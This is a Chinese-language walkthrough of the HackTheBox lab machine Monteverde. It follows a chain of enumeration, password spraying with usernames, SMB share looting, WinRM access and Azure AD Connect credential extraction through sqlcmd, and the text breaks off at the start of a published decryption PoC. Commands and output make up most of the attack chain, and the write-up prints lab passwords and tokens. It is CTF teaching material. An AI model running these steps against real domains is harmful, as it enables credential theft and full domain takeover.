---
title: 【先知】HTB-Monteverde：藏在 Azure XML 里的钥匙
source: https://xz.aliyun.com/news/92663
source_host: xz.aliyun.com
clip_date: 2026-08-11T15:12:47+08:00
trace_id: 6fb90e18-f1be-4dbb-919a-b4fbc77eea76
content_hash: d5b898b1e5269227f4f346114561410b94b605b00fa83a00065019606e11c163
status: synced
tags:
  - 先知
  - Windows渗透
  - Azure AD Connect
series: null
feed_source: 先知安全技术社区
ai_summary: HTB Monteverde 靶机通过弱口令进入 SABatchJobs，再在 users$ 共享的 mhope/azure.xml 中提取明文 Azure 密码，最终利用 Azure AD Connect 数据库加密配置还原域管密码。
ai_summary_style: key-points
images_status:
  total: 2
  succeeded: 2
  failed_urls: []
notion_page_id: 3b975244-d011-815a-a0b8-e1c407f3c41a
ioc: null
---

> 💡 **AI 总结（key-points）**
>
> HTB Monteverde 靶机通过弱口令进入 SABatchJobs，再在 users$ 共享的 mhope/azure.xml 中提取明文 Azure 密码，最终利用 Azure AD Connect 数据库加密配置还原域管密码。
> 
> - **入口：** 匿名 LDAP 枚举出 10 个域用户，在无锁定策略下尝试“用户名即密码”，SABatchJobs/SABatchJobs 通过 LDAP 认证，但无 WinRM 权限。
> - **关键共享：** SABatchJobs 可读 users$ 共享，发现 mhope 目录下 azure.xml，内含 Azure PowerShell 密码凭据 `4n0therD4y@n0th3r$`。
> - **获取用户 Shell：** 该密码对应 mhope，可通过 WinRM 登录；其 .Azure 目录的 TokenCache.dat 中还存有 Azure AccessToken 和 RefreshToken。
> - **提权思路：** 本机装有 Azure AD Connect，用 sqlcmd 查询 ADSync 库的 mms_management_agent 表，得到以 `encrypted_configuration` 存储的域管密码密文以及 keyset_id/instance_id/entropy。
> - **最终结果：** 使用研究员 Poc 调用 mcrypt.dll 解密，还原出 Administrator 密码 `d0m@in4dminyeah!`，进而 WinRM 登录取得 Root Flag。

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/cfeca85953ce15d3.png)

## 一、Nmap

TCP 全端口扫描：

```bash
$ sudo nmap -sS -p- -Pn -n -T4 --min-rate 5000 10.129.228.111 -oA tcp_ports
Starting Nmap 7.95 ( https://nmap.org ) at 2026-08-07 02:10 EDT
Nmap scan report for 10.129.228.111
Host is up (0.0073s latency).
Not shown: 65517 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49667/tcp open  unknown
49673/tcp open  unknown
49674/tcp open  unknown
49676/tcp open  unknown
49696/tcp open  unknown
```

针对开放端口进行详细扫描：

```bash
$ sudo nmap -sC -sV --reason -Pn -n -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49667,49673,49674,49676,49696 10.129.228.111 -oA tcp_ports_detail
Starting Nmap 7.95 ( https://nmap.org ) at 2026-08-07 02:11 EDT
Nmap scan report for 10.129.228.111
Host is up, received user-set (0.0075s latency).

PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2026-08-07 06:12:06Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 127
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 127
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49673/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49676/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49696/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: MONTEVERDE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-08-07T06:12:58
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 94.39 seconds
```

根据端口的开放情况，判断出目标是 AD 中的 DC。

将扫描结果中出现的域名添加到本地 `hosts` 文件中：

```bash
echo '10.129.228.111 MEGABANK.LOCAL MONTEVERDE.MEGABANK.LOCAL' | sudo tee -a /etc/hosts
```

## 二、枚举

### 1、SMB

SMB 匿名枚举共享资源：

```bash
$ smbmap -H 10.129.228.111 -u '' -p ''

[*] Detected 1 hosts serving SMB
[*] Established 1 SMB connections(s) and 0 authenticated session(s)
[!] Access denied on 10.129.228.111, no fun for you...
[*] Closed 1 connections
```

没结果。

尝试 `guest` 用户 + 空密码：

```bash
$ smbmap -H 10.129.228.111 -u 'guest' -p ''

[*] Detected 1 hosts serving SMB
[*] Established 1 SMB connections(s) and 0 authenticated session(s)
[!] Access denied on 10.129.228.111, no fun for you...
[*] Closed 1 connections
```

依旧没有信息。

### 2、LDAP

通过 LDAP，匿名枚举用户：

```bash
$ netexec ldap 10.129.228.111 -u '' -p '' --users
LDAP        10.129.228.111  389    MONTEVERDE       [*] Windows 10 / Server 2019 Build 17763 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:None) (channel binding:No TLS cert)
LDAP        10.129.228.111  389    MONTEVERDE       [+] MEGABANK.LOCAL\:
LDAP        10.129.228.111  389    MONTEVERDE       [*] Enumerated 10 domain users: MEGABANK.LOCAL
LDAP        10.129.228.111  389    MONTEVERDE       -Username-                    -Last PW Set-       -BadPW-  -Description-                     
LDAP        10.129.228.111  389    MONTEVERDE       Guest                         <never>             0        Built-in account for guest access to the computer/domain
LDAP        10.129.228.111  389    MONTEVERDE       AAD_987d7f2f57d2              2020-01-03 06:53:24 0        Service account for the Synchronization Service with installation identifier 05c97990-7587-4a3d-b312-309adfc172d9 running on computer MONTEVERDE.
LDAP        10.129.228.111  389    MONTEVERDE       mhope                         2020-01-03 07:40:05 0                                          
LDAP        10.129.228.111  389    MONTEVERDE       SABatchJobs                   2020-01-03 20:48:46 0                                          
LDAP        10.129.228.111  389    MONTEVERDE       svc-ata                       2020-01-03 20:58:31 0                                          
LDAP        10.129.228.111  389    MONTEVERDE       svc-bexec                     2020-01-03 20:59:55 0                                          
LDAP        10.129.228.111  389    MONTEVERDE       svc-netapp                    2020-01-03 21:01:42 0                                          
LDAP        10.129.228.111  389    MONTEVERDE       dgalanos                      2020-01-03 21:06:10 0                                          
LDAP        10.129.228.111  389    MONTEVERDE       roleary                       2020-01-03 21:08:05 0                                          
LDAP        10.129.228.111  389    MONTEVERDE       smorgan                       2020-01-03 21:09:21 0
```

将结果放到用户字典中：

```bash
$ cat tmp | awk '{print $5}' >> users.txt

$ cat users.txt
Guest
AAD_987d7f2f57d2
mhope
SABatchJobs
svc-ata
svc-bexec
svc-netapp
dgalanos
roleary
smorgan
```

匿名进行 LDAP Search：

```bash
$ ldapsearch -H ldap://10.129.228.111 -x -b 'DC=MEGABANK,DC=LOCAL' >> ldapsearch_results
```

共有 6325 行结果：

```bash
$ wc -l ldapsearch_results
6325 ldapsearch_results
```

过滤关心的部分：

```bash
$ cat ldapsearch_results | rg -i 'pwd|password|default|secret' | awk '!seen[$0]++'
```

并没有发现什么有意思的信息。

查看密码策略：

```bash
$ cat ldapsearch_results | rg -i 'lockout'
lockoutDuration: -18000000000
lockOutObservationWindow: -18000000000
lockoutThreshold: 0
lockoutDuration: -18000000000
lockOutObservationWindow: -18000000000
lockoutThreshold: 0
```

能发现并没有开启账户锁定。

## 三、AS-REP Roasting

针对未开启预认证的用户，无需提供凭证即可成功申请到 TGT，从 AS-REP 中能获得用“用户长期密钥”加密的信息以及用于完整性验证的 Hash 值，在本地可以实行密码爆破。

对之前发现的用户列表，进行一轮 AS-REP Roasting：

```bash
$ netexec ldap 10.129.228.111 -u users.txt -p '' --asreproast output.txt
LDAP        10.129.228.111  389    MONTEVERDE       [*] Windows 10 / Server 2019 Build 17763 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:None) (channel binding:No TLS cert)
LDAP        10.129.228.111  389    MONTEVERDE       [-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
```

没有结果。

## 四、密码是用户名？

由于没有严苛的密码策略，我假设用户采用的密码是自己的用户名：

```bash
$ netexec ldap 10.129.228.111 -u users.txt -p users.txt --no-bruteforce --continue-on-success
LDAP        10.129.228.111  389    MONTEVERDE       [*] Windows 10 / Server 2019 Build 17763 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:None) (channel binding:No TLS cert)
LDAP        10.129.228.111  389    MONTEVERDE       [-] MEGABANK.LOCAL\Guest:Guest
LDAP        10.129.228.111  389    MONTEVERDE       [-] MEGABANK.LOCAL\AAD_987d7f2f57d2:AAD_987d7f2f57d2
LDAP        10.129.228.111  389    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:mhope
LDAP        10.129.228.111  389    MONTEVERDE       [+] MEGABANK.LOCAL\SABatchJobs:SABatchJobs
LDAP        10.129.228.111  389    MONTEVERDE       [-] MEGABANK.LOCAL\svc-ata:svc-ata
LDAP        10.129.228.111  389    MONTEVERDE       [-] MEGABANK.LOCAL\svc-bexec:svc-bexec
LDAP        10.129.228.111  389    MONTEVERDE       [-] MEGABANK.LOCAL\svc-netapp:svc-netapp
LDAP        10.129.228.111  389    MONTEVERDE       [-] MEGABANK.LOCAL\dgalanos:dgalanos
LDAP        10.129.228.111  389    MONTEVERDE       [-] MEGABANK.LOCAL\roleary:roleary
LDAP        10.129.228.111  389    MONTEVERDE       [-] MEGABANK.LOCAL\smorgan:smorgan
```

找到了一个凭证信息：

```plain
username: SABatchJobs
password: SABatchJobs
```

## 五、SABatchJobs

该用户并不具备登入 WinRM 的权限：

```bash
$ netexec winrm 10.129.228.111 -u 'SABatchJobs' -p 'SABatchJobs'
WINRM       10.129.228.111  5985   MONTEVERDE       [*] Windows 10 / Server 2019 Build 17763 (name:MONTEVERDE) (domain:MEGABANK.LOCAL)
WINRM       10.129.228.111  5985   MONTEVERDE       [-] MEGABANK.LOCAL\SABatchJobs:SABatchJobs
```

SMB 共享资源枚举：

```bash
$ smbmap -H 10.129.228.111 -u 'SABatchJobs' -p 'SABatchJobs'

[+] IP: 10.129.228.111:445      Name: MEGABANK.LOCAL            Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        azure_uploads                                           READ ONLY
        C$                                                      NO ACCESS       Default share
        E$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share
        SYSVOL                                                  READ ONLY       Logon server share
        users$                                                  READ ONLY
[*] Closed 1 connections
```

共有五个可读共享资源，其中有两个是非常规共享。

`azure_uploads` 中没有什么信息：

```bash
$ netexec smb 10.129.228.111 -u 'SABatchJobs' -p 'SABatchJobs' --spider azure_uploads --pattern '' >> smb_azure_uploads

$ cat smb_azure_uploads
SMB                      10.129.228.111  445    MONTEVERDE       [*] Windows 10 / Server 2019 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:False) (Null Auth:True)
SMB                      10.129.228.111  445    MONTEVERDE       [+] MEGABANK.LOCAL\SABatchJobs:SABatchJobs
SMB                      10.129.228.111  445    MONTEVERDE       [*] Spidering .
SMB                      10.129.228.111  445    MONTEVERDE       //10.129.228.111/azure_uploads/. [dir]
SMB                      10.129.228.111  445    MONTEVERDE       //10.129.228.111/azure_uploads/.. [dir]
```

`users$` 中，发现了一个 XML 文件：

```bash
$ netexec smb 10.129.228.111 -u 'SABatchJobs' -p 'SABatchJobs' --spider users\$ --pattern '' >> smb_users

$ cat smb_users | rg -v '\[\*\]|\[\+\]|\[dir\]'
SMB                      10.129.228.111  445    MONTEVERDE       //10.129.228.111/users$/mhope/azure.xml [lastm:'2020-01-03 22:59' size:1212]
```

通过 `smbclinet` 访问共享资源，下载该 XML 到本地：

```bash
$ smbclient -U 'SABatchJobs%SABatchJobs' //10.129.228.111/users$
Try "help" to get a list of possible commands.
smb: \> cd mhope
smb: \mhope\> get azure.xml
getting file \mhope\azure.xml of size 1212 as azure.xml (1.2 KiloBytes/sec) (average 1.2 KiloBytes/sec)
```

其中的内容：

```xml
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  <Obj RefId="0">
    <TN RefId="0">
      <T>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential</T>
      <T>System.Object</T>
    </TN>
    <ToString>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential</ToString>
    <Props>
      <DT N="StartDate">2020-01-03T05:35:00.7562298-08:00</DT>
      <DT N="EndDate">2054-01-03T05:35:00.7562298-08:00</DT>
      <G N="KeyId">00000000-0000-0000-0000-000000000000</G>
      <S N="Password">4n0therD4y@n0th3r$</S>
    </Props>
  </Obj>
</Objs>
```

有明文密码：

```plain
4n0therD4y@n0th3r$
```

对应的用户应该是目录名，即 `mhope` 。

## 六、mhope shell

该用户具备登入 WinRM 的权限：

```bash
$ netexec winrm 10.129.228.111 -u 'mhope' -p '4n0therD4y@n0th3r$'
WINRM       10.129.228.111  5985   MONTEVERDE       [*] Windows 10 / Server 2019 Build 17763 (name:MONTEVERDE) (domain:MEGABANK.LOCAL)
WINRM       10.129.228.111  5985   MONTEVERDE       [+] MEGABANK.LOCAL\mhope:4n0therD4y@n0th3r$ (Pwn3d!)
```

用 `evil-winrm` 能获得该用户的 Shell：

```bash
$ evil-winrm -i 10.129.228.111 -u 'mhope' -p '4n0therD4y@n0th3r$'

Evil-WinRM shell v3.9

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\mhope\Documents>
```

在 Desktop 目录中能找到 User Flag：

```powershell
*Evil-WinRM* PS C:\Users\mhope\Desktop> cat user.txt
0018ae************************
```

查看用户的组信息：

```bash
*Evil-WinRM* PS C:\> net user mhope /domain
User name                    mhope
Full Name                    Mike Hope
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            1/2/2020 4:40:05 PM
Password expires             Never
Password changeable          1/3/2020 4:40:05 PM
Password required            Yes
User may change password     No

Workstations allowed         All
Logon script
User profile
Home directory               \\monteverde\users$\mhope
Last logon                   8/7/2026 12:08:25 AM

Logon hours allowed          All

Local Group Memberships      *Remote Management Use
Global Group memberships     *Azure Admins         *Domain Users
The command completed successfully.
```

`Azure Admins` 似乎很有意思。

> Azure 是微软的云服务平台，之前在 XML 中找到的凭证信息，应该就是 mhope 用户用于登入 Azure 平台的。

在用户家目录中有一个 `.Azure` 目录：

```bash
*Evil-WinRM* PS C:\Users\mhope\.Azure> ls -force

    Directory: C:\Users\mhope\.Azure

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         1/3/2020   5:35 AM                ErrorRecords
-a----         1/3/2020   5:31 AM             34 AzurePSDataCollectionProfile.json
-a----         1/3/2020   5:35 AM           2794 AzureRmContext.json
-a----         1/3/2020   5:31 AM            191 AzureRmContextSettings.json
-a----         1/3/2020   5:36 AM           7896 TokenCache.dat
```

这是 Azure Powershell 模块在本地缓存的配置和认证信息。

在 `TokenCache.dat` 中能找到 AccessToken 以及 Refresh Token：

```bash
[snip]
"RefreshToken": "AQABAAAAAACQN9QBRU3jT6bcBQLZNUj7aeQ8R2hfsMQE-DIEEp8rOWPiom2rNwROtUThYh6cCyfB9McL8XdHR94VQSY3KAN-SWuINLqSnI_Lfj-vM1nsCu_Kh51XTceMlWr9mZsNYiX5oCnIBT50bCWIlyeZxmpR7L4sfRp_2iESLU06U0QiHBP7L_HR75crAfpQdJ2oJEn9MWYoxFKIHxXRgAp8fwyKa5yVo5usuanLFGofYzvU6YUGwSFwHskyy_iHdmimggyI7pxp2-C0pSlRp6yZp-4JYyvoeTjxqtXkpMR7VnmJ5qIqJvecNcutXPu-SJDWRvvmW_V2se4V1u1ecuJDe02oAmouL7yp8HrcOBNgn9Jg_f27tHJSbONR-rFWFmeYr-Zi84EJbubYBb7DdzZaoCArbYrgglrAOmz85N9-DMbIJdT7ffteT0hu2rHI6OVDvgckNv-XVhwMF55XtjxxxhpR1EljIq07qCPCqSVoNnoyhDawgyYiNRh0EVr1kf6GEA9bAYNMHgf3VN5WApXbb0VzoxozBKNkNiMybB-uA1d9DLs1eOimxrhoKjsK6cyKTsslGe8qgjcLS0pcRDVvNub1_fKQAXqVB4WZXMo_TDSALh-ctiwVVFNRqTeGsdzcfJe7j3WwzuIiuWfIYydSQKaeRo87qtg6v4dHy4hVBOwm-NPah29sOrSNsyuUydhkNK2QXCwn_hV5-7OCwfSJHG9Dja4r8B_iS0-VvcwzRUT_-2t1eNN8vgRgTlgAdotG330U9SshDgVjg27VHIw-e-57ID7FTEjnVfc4loRNjoNJlSAA",
[snip]
"AccessToken":"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6InBpVmxsb1FEU01LeGgxbTJ5Z3FHU1ZkZ0ZwQSIsImtpZCI6InBpVmxsb1FEU01LeGgxbTJ5Z3FHU1ZkZ0ZwQSJ9.eyJhdWQiOiJodHRwczovL2dyYXBoLndpbmRvd3MubmV0LyIsImlzcyI6Imh0dHBzOi8vc3RzLndpbmRvd3MubmV0LzM3MmVmZWE5LTdiYzQtNGI3Ni04ODM5LTk4NGI0NWVkZmI5OC8iLCJpYXQiOjE1NzgwNTgyNzYsIm5iZiI6MTU3ODA1ODI3NiwiZXhwIjoxNTc4MDYyMTc2LCJhY3IiOiIxIiwiYWlvIjoiNDJWZ1lBZ3NZc3BPYkdtYjU4V3ZsK0d3dzhiYXA4bnhoOWlSOEpVQit4OWQ5L0g2MEFBQSIsImFtciI6WyJwd2QiXSwiYXBwaWQiOiIxOTUwYTI1OC0yMjdiLTRlMzEtYTljZi03MTc0OTU5NDVmYzIiLCJhcHBpZGFjciI6IjAiLCJmYW1pbHlfbmFtZSI6IkNsYXJrIiwiZ2l2ZW5fbmFtZSI6IkpvaG4iLCJpcGFkZHIiOiI0Ni40LjIyMy4xNzMiLCJuYW1lIjoiSm9obiIsIm9pZCI6ImU0ZjU2YmMxLTAyMWYtNDc5NS1iY2EyLWJlZGZjODE5ZTkwYSIsInB1aWQiOiIxMDAzMjAwMDkzOTYzMDJCIiwic2NwIjoiNjJlOTAzOTQtNjlmNS00MjM3LTkxOTAtMDEyMTc3MTQ1ZTEwIiwic3ViIjoiVWFTMGI5ZHJsMmlmYzlvSXZjcUFlbzRoY3c1YWpyV3g3bU5DMklrMkRsayIsInRlbmFudF9yZWdpb25fc2NvcGUiOiJFVSIsInRpZCI6IjM3MmVmZWE5LTdiYzQtNGI3Ni04ODM5LTk4NGI0NWVkZmI5OCIsInVuaXF1ZV9uYW1lIjoiam9obkBhNjc2MzIzNTQ3NjNvdXRsb29rLm9ubWljcm9zb2Z0LmNvbSIsInVwbiI6ImpvaG5AYTY3NjMyMzU0NzYzb3V0bG9vay5vbm1pY3Jvc29mdC5jb20iLCJ1dGkiOiJsM2xBR3NBRVYwcVdQelJ1Vkh4U0FBIiwidmVyIjoiMS4wIn0.czHUwYjleGp2C1c_BMZIZkEHz-12R86qmngaiyTeTW_bM659hqetbQylvf_qCJDuxD8e28H6Oqw5Hn1Hwij7yHK-kOjUeUlXkGyzFhQbDf3CQLvFsZioUiHHiighrVjZfu6Rolv8fxoG3Q8cXS-Ms_Wm6RI-zcaK9Eyu841D51jzvYI60rC9HTummktfVURP2xf3DnskqjJF1dDlSi62gPGXGk0xZordZFiGoYAtv8qiMAiSCioN_sw_xWRJ250nvw90biQ1NkPRpSGf8jNpbYktB0Ti8-sNblaGRJBQqmHxZ-0PkSq31op2CzHN7wwYCJOEoJpOtS-x4j1DGZ19hA",
[snip]
```

开头提供了认证服务器：

```plain
https://login.windows.net/372efea9-7bc4-4b76-8839-984b45edfb98/
```

这明显不属于本靶机的范畴了。

## 七、Password Hash Synchronisation

在 Program Files 目录中，能找到与 Azure 有关的程序：

```powershell
*Evil-WinRM* PS C:\Program Files> ls *Azure*


    Directory: C:\Program Files


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         1/2/2020   2:51 PM                Microsoft Azure Active Directory Connect
d-----         1/2/2020   3:37 PM                Microsoft Azure Active Directory Connect Upgrader
d-----         1/2/2020   3:02 PM                Microsoft Azure AD Connect Health Sync Agent
d-----         1/2/2020   2:53 PM                Microsoft Azure AD Sync
```

Azure AD（现已更名为 Microsoft Entra ID）是微软推出的基于云端的身份与访问管理服务。

其功能的实现，依赖于本地与云端的同步，而同步功能依靠的是 Azure AD Connect 这个工具。

其核心进程名为 `miiserver` ，在靶机中可以找到：

```powershell
*Evil-WinRM* PS C:\Program Files\Microsoft Azure AD Sync\Bin> get-process

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
[snip]
1032      71   341352     288216              4380   0 miiserver
[snip]
```

根据 [这篇文章](https://blog.xpnsec.com/azuread-connect-for-redteam/) ，在 AD 中安装 Azure AD Connect 的时候，会：

-   自动创建一个用户，名为 `MSOL_[HEX]`
-   自动部署一个 SQL Server Express LocalDB

但是，在本靶机中，这两点均不符合：

-   找不到 `MSOL_[HEX]` 用户：作者直接将 `MSOL_[HEX]` 用户用 **域管** 替代，因为 Azure AD Connect 创建该用户的核心目的，是使域内有一个“能完成同步”的账户，即拥有 `DS-Replication-Get-Changes` 和 `DS-Replication-Get-Changes-All` 两个权限，明显域管也完全能胜任。
-   用的不是 SQL Server Express LocalDB，而是完整的 SQL Server。

研究员发现，该数据库中的 `mms_management_agent` 表中的 `encrypted_configuration` 字段中，存放着 `MSOL_[HEX]` 用户的密码（经过加密）。

用 `sqlcmd` 进行数据库查询：

```powershell
*Evil-WinRM* PS C:\Users\mhope\Documents> sqlcmd -d ADSync -Q "SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = 'AD'" -y 0
<adma-configuration>
 <forest-name>MEGABANK.LOCAL</forest-name>
 <forest-port>0</forest-port>
 <forest-guid>{00000000-0000-0000-0000-000000000000}</forest-guid>
 <forest-login-user>administrator</forest-login-user>
 <forest-login-domain>MEGABANK.LOCAL</forest-login-domain>
 <sign-and-seal>1</sign-and-seal>
 <ssl-bind crl-check="0">0</ssl-bind>
 <simple-bind>0</simple-bind>
 <default-ssl-strength>0</default-ssl-strength>
 <parameter-values>
  <parameter name="forest-login-domain" type="string" use="connectivity" dataType="String">MEGABANK.LOCAL</parameter>
  <parameter name="forest-login-user" type="string" use="connectivity" dataType="String">administrator</parameter>
  <parameter name="password" type="encrypted-string" use="connectivity" dataType="String" encrypted="1" />
  <parameter name="forest-name" type="string" use="connectivity" dataType="String">MEGABANK.LOCAL</parameter>
  <parameter name="sign-and-seal" type="string" use="connectivity" dataType="String">1</parameter>
  <parameter name="crl-check" type="string" use="connectivity" dataType="String">0</parameter>
  <parameter name="ssl-bind" type="string" use="connectivity" dataType="String">0</parameter>
  <parameter name="simple-bind" type="string" use="connectivity" dataType="String">0</parameter>
  <parameter name="Connector.GroupFilteringGroupDn" type="string" use="global" dataType="String" />
  <parameter name="ADS_UF_ACCOUNTDISABLE" type="string" use="global" dataType="String" intrinsic="1">0x2</parameter>
  <parameter name="ADS_GROUP_TYPE_GLOBAL_GROUP" type="string" use="global" dataType="String" intrinsic="1">0x00000002</parameter>
  <parameter name="ADS_GROUP_TYPE_DOMAIN_LOCAL_GROUP" type="string" use="global" dataType="String" intrinsic="1">0x00000004</parameter>
  <parameter name="ADS_GROUP_TYPE_LOCAL_GROUP" type="string" use="global" dataType="String" intrinsic="1">0x00000004</parameter>
  <parameter name="ADS_GROUP_TYPE_UNIVERSAL_GROUP" type="string" use="global" dataType="String" intrinsic="1">0x00000008</parameter>
  <parameter name="ADS_GROUP_TYPE_SECURITY_ENABLED" type="string" use="global" dataType="String" intrinsic="1">0x80000000</parameter>
  <parameter name="Forest.FQDN" type="string" use="global" dataType="String" intrinsic="1">MEGABANK.LOCAL</parameter>
  <parameter name="Forest.LDAP" type="string" use="global" dataType="String" intrinsic="1">DC=MEGABANK,DC=LOCAL</parameter>
  <parameter name="Forest.Netbios" type="string" use="global" dataType="String" intrinsic="1">MEGABANK</parameter>
</parameter-values>
 <password-hash-sync-config>
            <enabled>1</enabled>
            <target>{B891884F-051E-4A83-95AF-2544101C9083}</target>
         </password-hash-sync-config>
</adma-configuration> 8AAAAAgAAABQhCBBnwTpdfQE6uNJeJWGjvps08skADOJDqM74hw39rVWMWrQukLAEYpfquk2CglqHJ3GfxzNWlt9+ga+2wmWA0zHd3uGD8vk/vfnsF3p2aKJ7n9IAB51xje0QrDLNdOqOxod8n7VeybNW/1k+YWuYkiED3xO8Pye72i6D9c5QTzjTlXe5qgd4TCdp4fmVd+UlL/dWT/mhJHve/d9zFr2EX5r5+1TLbJCzYUHqFLvvpCd1rJEr68g95aWEcUSzl7mTXwR4Pe3uvsf2P8Oafih7cjjsubFxqBioXBUIuP+BPQCETPAtccl7BNRxKb2aGQ=
```

`MSOL_[HEX]` 被作者替换成了域管 Administrator（原因已在上面提到），密码也确实经过加密：

```bash
$ echo -n '8AAAAAgAAABQhCBBnwTpdfQE6uNJeJWGjvps08skADOJDqM74hw39rVWMWrQukLAEYpfquk2CglqHJ3GfxzNWlt9+ga+2wmWA0zHd3uGD8vk/vfnsF3p2aKJ7n9IAB51xje0QrDLNdOqOxod8n7VeybNW/1k+YWuYkiED3xO8Pye72i6D9c5QTzjTlXe5qgd4TCdp4fmVd+UlL/dWT/mhJHve/d9zFr2EX5r5+1TLbJCzYUHqFLvvpCd1rJEr68g95aWEcUSzl7mTXwR4Pe3uvsf2P8Oafih7cjjsubFxqBioXBUIuP+BPQCETPAtccl7BNRxKb2aGQ=' | base64 -d | xxd
00000000: f000 0000 0800 0000 5084 2041 9f04 e975  ........P. A...u
00000010: f404 eae3 4978 9586 8efa 6cd3 cb24 0033  ....Ix....l..$.3
00000020: 890e a33b e21c 37f6 b556 316a d0ba 42c0  ...;..7..V1j..B.
00000030: 118a 5faa e936 0a09 6a1c 9dc6 7f1c cd5a  .._..6..j......Z
00000040: 5b7d fa06 bedb 0996 034c c777 7b86 0fcb  [}.......L.w{...
00000050: e4fe f7e7 b05d e9d9 a289 ee7f 4800 1e75  .....]......H..u
00000060: c637 b442 b0cb 35d3 aa3b 1a1d f27e d57b  .7.B..5..;...~.{
00000070: 26cd 5bfd 64f9 85ae 6248 840f 7c4e f0fc  &.[.d...bH..|N..
00000080: 9eef 68ba 0fd7 3941 3ce3 4e55 dee6 a81d  ..h...9A<.NU....
00000090: e130 9da7 87e6 55df 9494 bfdd 593f e684  .0....U.....Y?..
000000a0: 91ef 7bf7 7dcc 5af6 117e 6be7 ed53 2db2  ..{.}.Z..~k..S-.
000000b0: 42cd 8507 a852 efbe 909d d6b2 44af af20  B....R......D..
000000c0: f796 9611 c512 ce5e e64d 7c11 e0f7 b7ba  .......^.M|.....
000000d0: fb1f d8ff 0e69 f8a1 edc8 e3b2 e6c5 c6a0  .....i..........
000000e0: 62a1 7054 22e3 fe04 f402 1133 c0b5 c725  b.pT"......3...%
000000f0: ec13 51c4 a6f6 6864                      ..Q...hd
```

研究员经过逆向分析，发现 `mcrypt.dll` 组件中存在解密逻辑：

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/d06a66e2add9dd5e.png)

（图源于 [文章](https://blog.xpnsec.com/azuread-connect-for-redteam/) ）

获得解密密钥，还需要三个信息：

-   `InstanceId`
-   `KeySetId`
-   `Entropy`

在 `mms_server_configuration` 表中可以找到：

```powershell
*Evil-WinRM* PS C:\Program Files\Microsoft Azure AD Sync\Bin> sqlcmd -d 'ADSync' -Q 'SELECT keyset_id, instance_id, entropy FROM mms_server_configuration'
keyset_id   instance_id                          entropy
----------- ------------------------------------ ------------------------------------
          1 1852B527-DD4F-4ECF-B541-EFCCBFF29E31 194EC2FC-F186-46CF-B44D-071EB61F49CD

(1 rows affected)
```

接下来就可以获得解密密钥，并解密加密数据，最后输出结果。

那篇文章提供了完整的 Poc（放入一个 `.ps1` 文件中，接着上传到目标上运行）：

```powershell
Write-Host "AD Connect Sync Credential Extract POC (@_xpn_)`n"

$client = new-object System.Data.SqlClient.SqlConnection -ArgumentList "Server=127.0.0.1;Database=ADSync;Integrated Security=True"
